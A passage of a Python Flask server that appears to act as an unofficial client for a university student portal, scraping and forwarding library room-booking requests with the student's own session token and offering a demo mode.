        return jsonify(records)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/logout", methods=["POST"])
def api_logout():
    token = request.headers.get("X-Session-Token")
    if token in SESSIONS:
        del SESSIONS[token]
    return jsonify({"success": True})

@app.route("/api/library/bookings", methods=["GET"])
def api_library_bookings():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify([
            {
                "id": "1",
                "room": "Study Room 1",
                "date": "2026-07-20",
                "time": "14:00 - 16:00",
                "approved": "APPROVED",
                "remarks": "Demo Booking"
            }
        ])
        
    session = session_data["session"]
    try:
        res = session.get("https://student.bnu.edu.pk/library/room-allocation-list")
        if res.status_code != 200:
            return jsonify({"error": "Failed to fetch bookings list"}), res.status_code
            
        soup = BeautifulSoup(res.content, "html.parser")
        table = soup.find("table")
        if not table:
            return jsonify([])
            
        records = []
        for row in table.find_all("tr")[1:]:
            cols = [td.get_text(strip=True) for td in row.find_all("td")]
            if len(cols) >= 6:
                records.append({
                    "id": cols[0],
                    "room": cols[1],
                    "date": cols[2],
                    "time": cols[3],
                    "approved": cols[4],
                    "remarks": cols[5]
                })
        return jsonify(records)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/library/check", methods=["POST"])
def api_library_check():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify({"status": "available", "message": "Room is available for booking"})
        
    user_info = session_data["user"]
    api_token = user_info.get("api_token")
    
    try:
        req_data = request.json
        headers = {
            "Accept": "application/json",
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        res = requests.post(
            "https://student.bnu.edu.pk/api/library/check-room-allocation",
            headers=headers,
            json=req_data
        )
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/library/book", methods=["POST"])
def api_library_book():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify({"success": True, "message": "Room booked successfully!"})
        
    user_info = session_data["user"]
    api_token = user_info.get("api_token")
    
    try:
        req_data = request.json
        headers = {
            "Accept": "application/json",
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        res = requests.post(
            "https://student.bnu.edu.pk/api/library/store-room-allocation",
            headers=headers,
            json=req_data
        )
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/library/validate", methods=["POST"])
def api_library_validate():
    token = request.headers.get("X-Session-Token")
    session_data = get_session_data(token)
    if not session_data:
        return jsonify({"error": "Unauthorized"}), 401
        
    if session_data.get("is_demo"):
        return jsonify({"success": True, "name": "Demo Student"})
        
    user_info = session_data["user"]
    api_token = user_info.get("api_token")
    
    try:
        req_data = request.json
        headers = {
            "Accept": "application/json",
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        res = requests.post(
            "https://student.bnu.edu.pk/api/library/validate-enrollment",
            headers=headers,
            json=req_data
        )
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
